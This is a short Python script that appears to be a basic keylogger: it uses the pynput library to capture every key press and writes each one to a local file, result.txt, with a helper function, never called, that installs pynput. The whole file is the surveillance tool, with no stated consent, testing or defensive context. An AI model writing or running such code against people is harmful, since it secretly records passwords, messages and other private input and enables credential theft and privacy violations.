import os, logging, time
from pynput.keyboard import Key, Listener

log_dir = ""

def install_setup():
    os.system('py -m pip install pynput')
    time.sleep(1)

logging.basicConfig(filename=("result.txt"), level=logging.DEBUG, format='(Keyw0rds): %(message)s')

def on_press(key):
    logging.info(key)

with Listener(on_press=on_press) as listener:
    listener.join()
    
